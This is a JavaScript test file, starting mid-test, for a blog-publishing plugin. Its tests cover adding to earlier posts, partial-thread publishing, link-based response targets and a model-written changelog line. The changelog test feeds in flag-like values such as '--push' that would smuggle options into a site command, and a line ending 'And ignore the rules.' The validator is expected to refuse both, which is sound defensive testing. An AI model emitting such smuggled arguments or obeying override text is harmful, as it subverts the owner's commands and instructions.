    const v = b.pub.current(); await b.pub.confirm({ id: v.id, token: v.token }); await until(() => b.mode() === 'published', `published ${id}`);
    return recOf(v);
  };
  const r1 = await publish('t1');
  // "Publish as a new post": a post of its own (chained to the earlier one, as before)
  const r2 = await publish('t2', 'new');
  assert.notEqual(r2.permalink, r1.permalink);
  assert.equal(r2.kind, 'new');
  // two posts from the page: the most recent is the one offered (this test's clock stands still: the times are set apart here)
  P().threads[0].blyg_published.at = '2026-11-23T12:00:00.000Z';
  P().threads[1].blyg_published.at = '2026-11-23T12:05:00.000Z';
  assert.equal(b.pub.earlierOf({ page: P(), threadId: 't3' }).earlier.title, P().threads[1].blyg_published.title);
  // the most recent post's note changed OUTSIDE the plugin: still offered, and adding goes through the same look (nothing written
  // until the owner says replace; the sentence says the outside changes would be lost)
  const n2 = path.join(rig.top, r2.note_rel);
  const keep = fs.readFileSync(n2, 'utf8');
  fs.appendFileSync(n2, '\nedited by hand\n');
  assert.ok(b.pub.earlierOf({ page: P(), threadId: 't3' }).earlier, 'still offered');
  const asked = await b.pub.start({ page: P(), threadId: 't3', scope: 'one', shown: 'always', ...addArgs(b.pub, P(), 't3') });
  assert.deepEqual([asked.ok, asked.error, asked.outside && asked.outside.say], [false, R.OUTSIDE_SAY, R.OUTSIDE_SAY]);
  assert.match(R.OUTSIDE_SAY, /would be lost/);
  assert.equal(fs.readFileSync(n2, 'utf8'), keep + '\nedited by hand\n', 'nothing written');
  fs.writeFileSync(n2, keep);
  assert.ok(b.pub.earlierOf({ page: P(), threadId: 't3' }).earlier);
  // a post with no record of its note here (published by an older companion): no offer
  const postsFile = path.join(path.dirname(b.file), 'blyg-publish-posts.json');
  const posts = JSON.parse(fs.readFileSync(postsFile, 'utf8'));
  fs.writeFileSync(postsFile, JSON.stringify({ ...posts, [r2.permalink]: { ...posts[r2.permalink], note_sha: undefined } }));
  assert.equal(b.pub.earlierOf({ page: P(), threadId: 't3' }).earlier, null);
  fs.writeFileSync(postsFile, JSON.stringify(posts));
  // the target: the page now marked "not a response" while the post answered it: two different targets, no offer
  P().export_response = 'not-a-response';
  assert.equal(b.pub.earlierOf({ page: P(), threadId: 't3' }).earlier, null);
  delete P().export_response;
  // a post recorded before the target was kept: compared by its whole stub (here the same), and by "none" when it had none
  fs.writeFileSync(postsFile, JSON.stringify({ ...posts, [r2.permalink]: { ...posts[r2.permalink], snapshot: { ...posts[r2.permalink].snapshot, target: undefined } } }));
  assert.ok(b.pub.earlierOf({ page: P(), threadId: 't3' }).earlier, 'an older record with the same stub');
  fs.writeFileSync(postsFile, JSON.stringify(posts));
  // no edit commands: nothing can be added
  const noEdit = boot(rig, { page: P(), config: rig.home });
  assert.equal(noEdit.pub.earlierOf({ page: P(), threadId: 't3' }).earlier, null);
  // the added comment takes the post's number of comments past the cap: no offer
  const many = blygPage(Array.from({ length: 13 }, (_, i) => ({ id: `m${i}`, quote: `P${i}.`, blyg: stamp(), msgs: [mine(`Thought ${i}.`, { ts: String(i) })] })));
  const c = boot(rig, { page: many, config: home });
  const r = await c.pub.start({ page: c.pages.get(many.url), threadId: 'm11', scope: 'above', shown: 'always' });
  assert.ok(r.ok, r.error); await until(() => c.mode() === 'planned', 'planned (12)');
  const cv = c.pub.current(); await c.pub.confirm({ id: cv.id, token: cv.token }); await until(() => c.mode() === 'published', 'published (12)');
  assert.equal(c.pub.earlierOf({ page: c.pages.get(many.url), threadId: 'm12' }).earlier, null, 'twelve already: a thirteenth does not fit');
});

test('ADD TO THE EARLIER POST, given up: the note is put back exactly as version 1, as for any new version (the same machinery)', async t => {
  const rig = makeRig({ discard: true }); t.after(rig.done);
  const cmd = step => [process.execPath, FAKE, rig.log, rig.ctl, step, '{note}'];
  const home = { ...rig.home, commands: { ...rig.home.commands, ...EDIT(rig), abandon: cmd('abandon') } };
  const page = blygPage([{ id: 't1', quote: 'A passage.', blyg: stamp(), msgs: [mine('First thought.', { ts: '1' })] },
    { id: 't2', quote: 'Another.', blyg: stamp(), msgs: [mine('Added later.', { ts: '2' })] }]);
  const b = boot(rig, { page, config: home });
  const P = () => b.pages.get(b.page.url);
  (await b.start('t1')); await until(() => b.mode() === 'planned', 'planned');
  let v = b.pub.current(); const rel = recOf(v).note_rel;
  await b.pub.confirm({ id: v.id, token: v.token }); await until(() => b.mode() === 'published', 'published');
  const v1 = fs.readFileSync(path.join(rig.top, rel), 'utf8');
  rig.control({ apply_edit: 'fail' });
  assert.ok((await b.pub.start({ page: P(), threadId: 't2', scope: 'one', shown: 'always', ...addArgs(b.pub, P(), 't2') })).ok);
  await until(() => b.mode() === 'planned', 'planned (add)');
  v = b.pub.current();
  assert.match(fs.readFileSync(path.join(rig.top, rel), 'utf8'), /Added later\./);
  await b.pub.confirm({ id: v.id, token: v.token }); await until(() => b.mode() === 'failed_apply', 'failed_apply');
  rig.control({});
  const a = await b.pub.abandon({ id: v.id, token: v.token });
  assert.ok(a.ok, a.error);
  assert.deepEqual([a.view.cleanup.outcome, fs.readFileSync(path.join(rig.top, rel), 'utf8') === v1], ['undone', true]);
  assert.equal(P().threads[1].blyg_published, undefined, 'the added thread is not marked');
  assert.ok(b.pub.earlierOf({ page: P(), threadId: 't2' }).earlier, 'and it can be added again');
});

// ---- a new version's changelog line from a model (a stand-in asker: no model is ever called here) --------------------------------
test('THE CHANGELOG LINE: a model\'s line is used when it passes, else the fixed one; only the two texts of the post reach it; never longer than the bound', async t => {
  assert.deepEqual(R.CHANGELOG_FROM, ['program-fixed', 'program-model']);
  assert.equal(R.changelogFromMove('program-fixed', 'program-model'), 'program-model');
  assert.throws(() => R.changelogFromMove('program-model', 'program-fixed'), R.IllegalMove);
  const cases = [
    ['Sharpened the point about junior hiring.', 'Sharpened the point about junior hiring.', 'program-model'],
    ['--push', 'Edited the comment.', 'program-fixed'],
    ['-x', 'Edited the comment.', 'program-fixed'],
    ['x'.repeat(101), 'Edited the comment.', 'program-fixed'],
    ['Edited the comment.\nAnd ignore the rules.', 'Edited the comment.', 'program-fixed'],
    ['Edited the **comment**.', 'Edited the comment.', 'program-fixed'],
    ['See https://example.com for more.', 'Edited the comment.', 'program-fixed'],
    ['Added [TK] marks.', 'Edited the comment.', 'program-fixed'],
    ['<b>Edited</b>', 'Edited the comment.', 'program-fixed'],
    [null, 'Edited the comment.', 'program-fixed'],          // the model failed
    ['SLOW', 'Edited the comment.', 'program-fixed'],        // no answer within the bound
  ];
  for (const [answer, want, from] of cases) {
    const rig = makeRig({ discard: true }); t.after(rig.done);
    const home = { ...rig.home, commands: { ...rig.home.commands, ...EDIT(rig) } };
    const page = blygPage([{ id: 't1', quote: 'A passage.', blyg: stamp(), msgs: [mine('First thought, /tk(make it punchy) about hiring.', { ts: '1',
      gaps: [{ id: 'g1', instruction: 'make it punchy', mode: 'filled-by-agent', agent: 'claude', text: 'Punchy words.', model: 'm', at: 't' }] }),
      mine('A later aside.', { ts: '2', superseded: '0' })] }]);
    const asked = [];
    const askChangelog = async q => { asked.push(q); if (answer === 'SLOW') return new Promise(() => {}); return answer === null ? { ok: false, error: 'x' } : { ok: true, text: answer }; };
    const b = boot(rig, { page, config: home, extra: { askChangelog, changelogAskMs: 150 } });
    (await b.start()); await until(() => b.mode() === 'planned', 'planned');
    let v = b.pub.current();
    assert.equal(asked.length, 0, 'a NEW post asks nothing');
    await b.pub.confirm({ id: v.id, token: v.token }); await until(() => b.mode() === 'published', 'published');
    b.pages.get(b.page.url).threads[0].msgs[0].text = 'First thought, sharpened, /tk(make it punchy) about hiring.';
    const t0 = Date.now();
    const e = await b.start(); assert.ok(e.ok, e.error);
    await until(() => b.mode() === 'planned', 'planned (edit)');
    assert.ok(Date.now() - t0 < 3000, 'never waits longer than the bound');
    v = b.pub.current();
    assert.equal(v.changelog, want, JSON.stringify(answer));
    assert.equal(recOf(v).changelog_from, from);
    const plan = rig.calls().filter(c => c.step === 'plan_edit').at(-1);
    assert.equal(plan.argv.at(-1), want, 'the line the owner sees is the one the site is given');
    assert.equal(asked.length, 1);
    const q = asked[0];
    assert.equal(q.model, 'claude-haiku-5-5', 'its own setting, the cheap model by default');
    assert.ok(q.prompt.includes('First thought, sharpened,') && q.prompt.includes('First thought, about hiring.') === false && q.prompt.includes('Punchy words.') && q.prompt.includes('A passage.'), q.prompt);
    assert.ok(!q.prompt.includes('make it punchy'), 'never a /tk instruction');
    assert.ok(!q.prompt.includes('A later aside.'), 'never a set-aside message');
    assert.ok(!q.prompt.includes(b.page.url) && !q.prompt.includes('blyg_id') && !q.prompt.includes('permalink'), 'nothing of the page or the front matter');
    assert.ok(!q.prompt.includes('A made-up post'), 'not the page title');
    v = b.pub.current(); await b.pub.cancel({ id: v.id, token: v.token });
  }
  // the depth rule: a line that quotes six words the new version removed is refused
  const N = await import('../blyg-note.mjs');
  assert.equal(N.changelogAnswerOk('Removed the line about the quick brown fox jumping high.', { before: 'the quick brown fox jumping high over', after: 'nothing' }), '');
  assert.equal(N.changelogAnswerOk('Made the opening shorter.', { before: 'a b', after: 'a' }), 'Made the opening shorter.');
  assert.equal(N.changelogAnswerOk('One sentence. Two sentences.'), '', 'one sentence');
  // NEVER A FLAG: the line goes to the site's commands as one argument, so it must begin with a letter (any script's)
  for (const bad of ['--push', '--no-mentions', '--quick', '-x', '- Added a comment.', '—Added a comment.', '1 comment added.', '.Added', ' --push', '(Added a comment.)', '\u2014x'])
    assert.equal(N.changelogAnswerOk(bad), '', JSON.stringify(bad));
  for (const good of ['Added a comment.', 'Ajouté un commentaire.', 'Écrit autrement.', 'Обновлён комментарий.'])
    assert.equal(N.changelogAnswerOk(good), good, good);
  assert.ok(N.CHANGELOG_LINE_START.test('a') && !N.CHANGELOG_LINE_START.test('-a'));
});

test('ADD never drops a comment: a post whose thread is gone from the page is not offered; republished from a remaining thread it says so and always stops for a look', async t => {
  const rig = makeRig({ discard: true, confirm: 'never', extra: { plan_guard: ['--only-note'] } }); t.after(rig.done);
  const home = { ...rig.home, commands: { ...rig.home.commands, ...EDIT(rig) } };
  const page = blygPage([{ id: 'A', quote: 'Pa.', blyg: stamp(), msgs: [mine('Comment A.', { ts: '1', channel: 'drawer' })] },
    { id: 'B', quote: 'Pb.', blyg: stamp(), msgs: [mine('Comment B.', { ts: '2', channel: 'drawer' })] },
    { id: 'C', quote: 'Pc.', blyg: stamp(), msgs: [mine('Comment C.', { ts: '3', channel: 'drawer' })] }]);
  const b = boot(rig, { page, config: home });
  const P = () => b.pages.get(b.page.url);
  // A and B in one post ("this and the ones above", one click)
  assert.ok((await b.pub.start({ page: P(), threadId: 'B', scope: 'above', shown: 'never' })).ok);
  await until(() => b.mode() === 'published', 'published A+B');
  assert.deepEqual(P().threads.map(x => !!x.blyg_published), [true, true, false]);
  assert.ok(b.pub.earlierOf({ page: P(), threadId: 'C' }).earlier, 'both threads here: offered');
  // the owner deletes B
  P().threads = P().threads.filter(x => x.id !== 'B');
  assert.equal(b.pub.earlierOf({ page: P(), threadId: 'C' }).earlier, null, 'B is gone: no offer (adding C would drop B)');
  const r = await b.pub.start({ page: P(), threadId: 'C', scope: 'one', shown: 'never', join: 'add', post: 'x', postVersion: '1' });
  assert.equal(r.error, R.ADD_GONE_SAY);
  // a republish from A: allowed, but it says so and it stops for the owner's look even with one click
  P().threads[0].msgs[0].text = 'Comment A, sharper.';
  const e = await b.pub.start({ page: P(), threadId: 'A', scope: 'one', shown: 'never' });
  assert.ok(e.ok, e.error);
  await until(() => b.mode() === 'planned', 'planned');
  await sleep(100);
  const v = b.pub.current();
  assert.deepEqual([v.mode, v.left_out, v.review, v.confirm], ['planned', 1, 'left-out', 'always'], 'never unseen');
  assert.ok(!rig.calls().some(c => c.step === 'apply_edit'), 'nothing applied without the look');
  // a record from before the thread list was kept: its snapshot's threads are the list
  const postsFile = path.join(path.dirname(b.file), 'blyg-publish-posts.json');
  await b.pub.cancel({ id: v.id, token: v.token });
  P().threads.splice(1, 0, { id: 'B', quote: 'Pb.', blyg: stamp(), msgs: [mine('Comment B.', { ts: '2', channel: 'drawer' })], blyg_published: { ...P().threads[0].blyg_published } });
  const posts = JSON.parse(fs.readFileSync(postsFile, 'utf8'));
  const key = Object.keys(posts)[0];
  fs.writeFileSync(postsFile, JSON.stringify({ [key]: { ...posts[key], thread_ids: undefined } }));
  assert.ok(b.pub.earlierOf({ page: P(), threadId: 'C' }).earlier, 'an older record: the snapshot names A and B, both here');
  P().threads = P().threads.filter(x => x.id !== 'B');
  assert.equal(b.pub.earlierOf({ page: P(), threadId: 'C' }).earlier, null, '…and B gone: no offer');
});

test('PUBLISH UP TO HERE: a post of the thread up to one message (later ones stay private); the point is kept, moves only forward, and the header republish says what it now adds', async t => {
  assert.deepEqual(R.EXTENTS, ['whole', 'upto']);
  const rig = makeRig({ discard: true, extra: {} }); t.after(rig.done);
  const home = { ...rig.home, commands: { ...rig.home.commands, ...EDIT(rig) } };
  const page = blygPage([{ id: 't1', quote: 'A passage.', blyg: stamp(), msgs: [mine('First words.', { ts: '1' }), mine('Second words.', { ts: '2' }), mine('Third words, private.', { ts: '3' })] }]);
  const b = boot(rig, { page, config: home });
  const go = (extra) => b.pub.start({ page: b.pages.get(b.page.url), threadId: 't1', scope: 'one', shown: 'always', ...extra });
  // odd asks are refused before anything is written
  assert.equal((await go({ extent: 'some' })).status, 400);
  assert.equal((await go({ extent: 'upto' })).status, 400, 'upto needs its message');
  assert.equal((await go({ upto: '2' })).status, 400, 'a message only with extent upto');
  assert.equal((await go({ extent: 'upto', upto: '9' })).error, R.UPTO_GONE_SAY);
  // up to message 2
  const r1 = await go({ extent: 'upto', upto: '2' });
  assert.ok(r1.ok, r1.error);
  assert.equal(r1.view.extent, 'upto');
  await until(() => b.mode() === 'planned', 'planned');
  let v = b.pub.current();
  const rel = recOf(v).note_rel;
  const text1 = fs.readFileSync(path.join(rig.top, rel), 'utf8');
  assert.match(text1, /First words\./); assert.match(text1, /Second words\./);
  assert.ok(!/Third words/.test(text1), 'the message after the point stays private');
  await b.pub.confirm({ id: v.id, token: v.token }); await until(() => b.mode() === 'published', 'published v1');
  const th = () => b.pages.get(b.page.url).threads[0];
  assert.equal(th().blyg_published.upto, '2', 'the thread says where its part of the post ends');
  const postsFile = path.join(path.dirname(b.file), 'blyg-publish-posts.json');
  assert.deepEqual(JSON.parse(fs.readFileSync(postsFile, 'utf8'))[th().blyg_published.permalink].points, { t1: '2' }, 'the post\'s record remembers the point');
  // a point never moves back
  const back = await go({ extent: 'upto', upto: '1' });
  assert.deepEqual([back.ok, back.error], [false, R.UPTO_BACK_SAY]);
  assert.equal(fs.readFileSync(path.join(rig.top, rel), 'utf8'), text1, 'nothing written');
  // the same point again: nothing changed
  assert.equal((await go({ extent: 'upto', upto: '2' })).error, 'Nothing has changed since you published this.');
  // the header: the whole thread, version 2, saying how many further messages it now includes
  const r2 = await go({});
  assert.ok(r2.ok, r2.error);
  assert.deepEqual([r2.view.kind, r2.view.version, r2.view.further, r2.view.changelog], ['edit', 2, 1, 'Added a comment.']);
  await until(() => b.mode() === 'planned', 'planned v2');
  v = b.pub.current();
  assert.match(fs.readFileSync(path.join(rig.top, rel), 'utf8'), /Third words, private\./);
  await b.pub.confirm({ id: v.id, token: v.token }); await until(() => b.mode() === 'published', 'published v2');
  assert.equal(th().blyg_published.version, 2);
  assert.equal(th().blyg_published.upto, undefined, 'whole again');
  assert.deepEqual(JSON.parse(fs.readFileSync(postsFile, 'utf8'))[th().blyg_published.permalink].points, {});
  // published whole: an earlier message's plane is refused too
  assert.equal((await go({ extent: 'upto', upto: '2' })).error, R.UPTO_BACK_SAY);
  // a fourth message, then its own plane: forward, version 3
  th().msgs.push(mine('Fourth words.', { ts: '4' }));
  const r3 = await go({ extent: 'upto', upto: '4' });
  assert.ok(r3.ok, r3.error);
  assert.equal(r3.view.version, 3);
});

test('A LONE LINK: a new post that quotes no blyg post and answers nothing, linking to exactly one other blyg\'s post, is a response to it; two posts, an unchecked link, the owner\'s own blyg or a quote keep it a plain post', async t => {
  const rig = makeRig({ discard: true, extra: {} }); t.after(rig.done);
  const home = { ...rig.home, commands: { ...rig.home.commands, ...EDIT(rig) } };
  const FRIEND = 'https://friend.example.test/blyg/';
  const FID = '7c9wk2mhq0v3xj8tn5rzfd41bg';
  const FPOST = `${FRIEND}t/${FID}/`;
  const OTHER = '1vgtgz0gq5b2c9k7d3m8r4n6xy';
  const answers = {
    [FPOST]: { status: 'blyg', item: { origin: FRIEND, id: FID, version: 3, page: FPOST, author: 'A Friend' } },
    [`${FRIEND}t/${OTHER}/`]: { status: 'blyg', item: { origin: FRIEND, id: OTHER, version: 1, page: `${FRIEND}t/${OTHER}/`, author: 'A Friend' } },
    'https://news.example.test/x': { status: 'not-a-blyg', reason: 'no manifest' },
    'https://down.example.test/y': { status: 'check-failed', reason: 'timeout' },
    'https://friend.example.test/copy': { status: 'blyg', item: { origin: FRIEND, id: FID, version: 3, page: FPOST, author: 'A Friend' } },
  };
  const asked = [];
  const detectLink = async url => { asked.push(url); return answers[url] || { status: 'not-a-blyg' }; };
  const web = words => ({ url: 'https://news.example.test/a/story', title: 'A story', threads: [{ id: 't1', quote: 'Hiring is slowing.', msgs: [mine(words, { ts: '1' })] }] });
  const tryWith = async (page, extra = {}, cfg = home) => {
    const b = boot(rig, { page, config: cfg, extra: { detectLink, ...extra } });
    const r = await b.start();
    if (!r.ok) return { r, b };
    await until(() => b.mode() === 'planned', 'planned');
    const v = b.pub.current();
    const text = fs.readFileSync(path.join(rig.top, recOf(v).note_rel), 'utf8');
    await b.pub.cancel({ id: v.id, token: v.token });
    return { r, b, v, text };
  };
  // exactly one linked post (with an ordinary link beside it): a response, verified, with its source
  let x = await tryWith(web(`Agree with [this post](${FPOST}) and [the news](https://news.example.test/x).`));
  assert.ok(x.r.ok, x.r.error);
  assert.match(x.text, new RegExp(`blyg_sources:\\n  - "${FPOST}"\\nblyg_stub_of:\\n  origin: "${FRIEND}"\\n  id: "${FID}"\\n  version: 3\\n`));
  assert.match(x.text, new RegExp(`\\[this post\\]\\(${FPOST.replace(/[./]/g, '\\$&')}\\)`), 'the link stays in the words');
  assert.equal(x.v.notify, 'A Friend will be told you responded, and your post will be shown as a response to that post');
  assert.deepEqual(asked.slice(-2), [FPOST, 'https://news.example.test/x']);
  // an autolink counts too
  x = await tryWith(web(`Yes: <${FPOST}>`));
  assert.match(x.text, /blyg_stub_of:\n  origin/);
  // two linked posts: both stay references
  x = await tryWith(web(`[One](${FPOST}) and [two](${FRIEND}t/${OTHER}/).`));
  assert.ok(!/blyg_stub_of/.test(x.text));
  // a link that could not be checked: it might be a second post, so nothing is assumed
  x = await tryWith(web(`[One](${FPOST}) and [down](https://down.example.test/y).`));
  assert.ok(!/blyg_stub_of/.test(x.text));
  // a page that merely names the post (not its own page) is not the post
  x = await tryWith(web('[A copy](https://friend.example.test/copy).'));
  assert.ok(!/blyg_stub_of/.test(x.text));
  // the owner's own blyg is not "another blyg"
  x = await tryWith(web(`[Mine](${FPOST}).`), {}, home);
  const own = boot(rig, { page: web(`[Mine](${FPOST}).`), config: home, extra: { detectLink, readConfig: () => ({ blyg_home: home, my_origins: [FRIEND] }) } });
  const ro = await own.start(); await until(() => own.mode() === 'planned', 'planned own');
  const vo = own.pub.current();
  assert.ok(!/blyg_stub_of/.test(fs.readFileSync(path.join(rig.top, recOf(vo).note_rel), 'utf8')));
  await own.pub.cancel({ id: vo.id, token: vo.token }); void ro;
  // a link inside code, or in an image, is not a link
  const before = asked.length;
  x = await tryWith(web(`\`[code](${FPOST})\` only.`));
  assert.ok(!/blyg_stub_of/.test(x.text));
  assert.equal(asked.length, before, 'nothing was asked about');
  // a post that quotes a blyg post keeps that target: the link stays a reference
  const quoted = blygPage([{ id: 't1', quote: 'A sentence.', blyg: stamp(), msgs: [mine(`Compare [this](${FPOST}).`, { ts: '1' })] }]);
  x = await tryWith(quoted);
  assert.match(x.text, new RegExp(`blyg_stub_of:\\n  origin: "https://blyg.example.test/notes/"\\n  id: "${ID}"`));
  assert.ok(!x.text.includes(`id: "${FID}"`));
  // checks off (no detectLink answer): a plain post
  x = await tryWith(web(`[this post](${FPOST})`), { detectLink: async () => null });
  assert.ok(!/blyg_stub_of/.test(x.text));
});

test('A LONE LINK, kept: a new version keeps the response target the post was published with, and a post published without one never gains it', async t => {
  const rig = makeRig({ discard: true, extra: {} }); t.after(rig.done);
  const home = { ...rig.home, commands: { ...rig.home.commands, ...EDIT(rig) } };
  const FRIEND = 'https://friend.example.test/blyg/';
  const FID = '7c9wk2mhq0v3xj8tn5rzfd41bg';
  const FPOST = `${FRIEND}t/${FID}/`;
  let on = true;
  const detectLink = async url => (on && url === FPOST ? { status: 'blyg', item: { origin: FRIEND, id: FID, version: 3, page: FPOST, author: 'A Friend' } } : { status: 'not-a-blyg' });
  const page = { url: 'https://news.example.test/a/story', title: 'A story', threads: [{ id: 't1', quote: 'Q.', msgs: [mine(`See [this](${FPOST}).`, { ts: '1' })] }] };
  const b = boot(rig, { page, config: home, extra: { detectLink } });
  await b.start(); await until(() => b.mode() === 'planned', 'planned');
  let v = b.pub.current();
  await b.pub.confirm({ id: v.id, token: v.token }); await until(() => b.mode() === 'published', 'published');
  on = false;   // the link would no longer be checked: the target is the post's record, not a new check
  b.pages.get(page.url).threads[0].msgs.push(mine('More words.', { ts: '2' }));
  const e = await b.start(); assert.ok(e.ok, e.error);
  await until(() => b.mode() === 'planned', 'planned v2');
  v = b.pub.current();
  assert.match(fs.readFileSync(path.join(rig.top, recOf(v).note_rel), 'utf8'), new RegExp(`blyg_stub_of:\\n  origin: "${FRIEND}"\\n  id: "${FID}"`));
  await b.pub.cancel({ id: v.id, token: v.token });
  // a post published WITHOUT a target, then a link added: no target appears on its new version
  const p2 = { url: 'https://news.example.test/b', title: 'B', threads: [{ id: 't1', quote: 'Q.', msgs: [mine('Plain words.', { ts: '1' })] }] };
  const c = boot(rig, { page: p2, config: home, extra: { detectLink: async () => ({ status: 'blyg', item: { origin: FRIEND, id: FID, version: 3, page: FPOST, author: 'A Friend' } }) } });
  await c.start(); await until(() => c.mode() === 'planned', 'planned c');
  v = c.pub.current(); await c.pub.confirm({ id: v.id, token: v.token }); await until(() => c.mode() === 'published', 'published c');
  c.pages.get(p2.url).threads[0].msgs.push(mine(`And [this](${FPOST}).`, { ts: '2' }));
  await c.start(); await until(() => c.mode() === 'planned', 'planned c2');
  v = c.pub.current();
  assert.ok(!/blyg_stub_of/.test(fs.readFileSync(path.join(rig.top, recOf(v).note_rel), 'utf8')), 'never gains a target on an edit');
});

test('A lone-link response and a header republish that adds held-back messages publish straight with one click (the reason recorded, 2026-11-25); the link checks are concurrent, bounded, and the run is held while they run', async t => {
  assert.ok(R.REVIEW_FACTS.includes('link-stub') && R.REVIEW_FACTS.includes('further'));
  assert.deepEqual(R.reviewFor('never', { linkStub: true }), { confirm: 'never', review: 'none', reasons: ['link-stub'] });
  assert.deepEqual(R.reviewFor('never', { further: true }), { confirm: 'never', review: 'none', reasons: ['further'] });
  const rig = makeRig({ discard: true, confirm: 'never', extra: {} }); t.after(rig.done);
  const home = { ...rig.home, confirm: 'never', plan_guard: ['--only-note'], commands: { ...rig.home.commands, ...EDIT(rig) } };
  const FRIEND = 'https://friend.example.test/blyg/';
  const FID = '7c9wk2mhq0v3xj8tn5rzfd41bg';
  const FPOST = `${FRIEND}t/${FID}/`;
  const yes = { status: 'blyg', item: { origin: FRIEND, id: FID, version: 3, page: FPOST, author: 'A Friend' } };
  // 2. one click, a lone link: publishes straight, the reason recorded
  const page = { url: 'https://news.example.test/a', title: 'A', threads: [{ id: 't1', quote: 'Q.', msgs: [mine(`See [this](${FPOST}).`, { ts: '1', channel: 'drawer' })] }] };
  const pristine = JSON.stringify(page);
  const b = boot(rig, { page, config: home, extra: { detectLink: async () => yes } });
  const r = await b.start('t1', 'one', 'never'); assert.ok(r.ok, r.error);
  await until(() => b.mode() === 'published', 'published');
  let v = b.pub.current();
  assert.deepEqual([v.review, v.confirm, v.reasons], ['none', 'never', ['link-stub']], 'one click sends a response to the one linked post');
  // (each case below starts from a page with nothing published)
  const fresh = () => JSON.parse(pristine);
  // 3. the run is HELD from the start's first moment: a second start while the first checks its links is refused
  let release;
  const slow = new Promise(res => { release = res; });
  const c = boot(rig, { page: fresh(), config: home, extra: { detectLink: () => slow.then(() => yes) } });
  const first = c.start('t1', 'one', 'never');
  await sleep(20);
  assert.equal(c.mode(), 'checking', 'held before any await');
  const second = await c.start('t1', 'one', 'never');
  assert.deepEqual([second.ok, second.status], [false, 409]);
  release();
  assert.ok((await first).ok);
  await until(() => c.mode() === 'published', 'published c');
  // …concurrently: three links of 60 ms each are all answered within a bound of 150 ms (one after another would take 180)
  const three = { url: 'https://news.example.test/b', title: 'B', threads: [{ id: 't1', quote: 'Q.', msgs: [mine(`[a](${FPOST}) [b](https://n.example.test/1) [c](https://n.example.test/2)`, { ts: '1', channel: 'drawer' })] }] };
  const d = boot(rig, { page: three, config: home, extra: { linkCheckMs: 150, detectLink: url => sleep(60).then(() => (url === FPOST ? yes : { status: 'not-a-blyg' })) } });
  await d.start('t1', 'one', 'never'); await until(() => d.mode() === 'published', 'published d');
  v = d.pub.current();
  assert.match(fs.readFileSync(path.join(rig.top, recOf(v).note_rel), 'utf8'), /blyg_stub_of:/);
  // …and past the bound: unverifiable, no target (and the run went on)
  const e = boot(rig, { page: fresh(), config: home, extra: { linkCheckMs: 50, detectLink: () => sleep(400).then(() => yes) } });
  await e.start('t1', 'one', 'never'); await until(() => ['planned', 'published'].includes(e.mode()), 'e');
  v = e.pub.current();
  assert.ok(!/blyg_stub_of/.test(fs.readFileSync(path.join(rig.top, recOf(v).note_rel), 'utf8')), 'a link not checked in time sets no target');
  await until(() => e.mode() === 'published', 'e published (one click, nothing to look at)');
  // 4. a post published "up to here", then the header with one click: the whole thread goes out (further, recorded)
  const up = { url: 'https://news.example.test/c', title: 'C', threads: [{ id: 't1', quote: 'Q.', msgs: [mine('One.', { ts: '1', channel: 'drawer' }), mine('Two.', { ts: '2', channel: 'drawer' })] }] };
  const f = boot(rig, { page: up, config: home, extra: { detectLink: async () => ({ status: 'not-a-blyg' }) } });
  await f.pub.start({ page: f.pages.get(up.url), threadId: 't1', scope: 'one', shown: 'never', extent: 'upto', upto: '1' });
  await until(() => f.mode() === 'published', 'f published');
  await f.start('t1', 'one', 'never'); await until(() => f.mode() === 'published' && f.pub.current().version === 2, 'f v2 published');
  v = f.pub.current();
  assert.deepEqual([v.review, v.confirm, v.further, v.reasons], ['none', 'never', 1, ['further']]);
});
